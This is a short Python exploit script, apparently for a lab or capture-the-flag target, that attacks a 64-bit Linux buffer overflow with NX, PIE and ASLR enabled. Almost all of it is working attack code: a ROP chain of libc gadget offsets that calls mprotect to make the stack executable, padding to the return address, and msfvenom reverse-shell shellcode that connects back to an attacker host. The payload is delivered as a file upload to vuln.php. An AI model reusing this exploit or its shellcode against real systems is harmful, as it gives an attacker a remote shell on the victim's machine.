#!/usr/bin/env python3
# Linux Buffer Overflow 64 bits NX, PIE, ASLR , RELRO Enabled using mprotect
# Without pwntools

# Checksec

# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      PIE enabled
     
# /proc/sys/kernel/randomize_va_space 2

import requests
import socket
import struct

# Read from maps file
libc_base = 0x7faf0a1fb000
libsql_base = 0x7faf0a3c0000
stack_start = 0x7ffe050d7000
stack_end = 0x7ffe050f8000

# Configure URL
URL = f'http://10.10.10.10/vuln.php'

# msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=80 -f py -v shellcode
shellcode =  b""
shellcode += b"\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05\x48"
shellcode += b"\x97\x48\xb9\x02\x00\x01\xbb\x0a\x0a\x0e\x75\x51\x48"
shellcode += b"\x89\xe6\x6a\x10\x5a\x6a\x2a\x58\x0f\x05\x6a\x03\x5e"
shellcode += b"\x48\xff\xce\x6a\x21\x58\x0f\x05\x75\xf6\x6a\x3b\x58"
shellcode += b"\x99\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68\x00\x53\x48"
shellcode += b"\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05"

def p64(num):
    return struct.pack("<Q", num)

# ROP Addresses
mprotect = p64(libc_base + 0xf8c20)   # readelf -s libc-2.31.so | grep " mprotect"
pop_rdi  = p64(libc_base + 0x26796)   # ropper -f libc-2.31.so --search "pop rdi"
pop_rsi  = p64(libc_base + 0x2890f)   # ropper -f libc-2.31.so --search "pop rsi"
pop_rdx  = p64(libc_base + 0xcb1cd)   # ropper -f libc-2.31.so --search "pop rdx"
jmp_rsp  = p64(libsql_base + 0xd431d) # ropper -f libsqlite3.so.0.8.6 --search "jmp rsp"
stack_size = stack_end - stack_start

buf  = b'A' * 520                     # get to ret address
buf += pop_rdi + p64(stack_start)     # RDI = memory to change
buf += pop_rsi + p64(stack_size)      # RSI = length of memory
buf += pop_rdx + p64(7)               # RDX = permissions; 7 = rwx
buf += mprotect                       # call mprotect
buf += jmp_rsp                        # jmp to stack
buf += shellcode                      # rev shell

# send exploit via file
resp = requests.post(URL, files = {'vulnparam': buf })
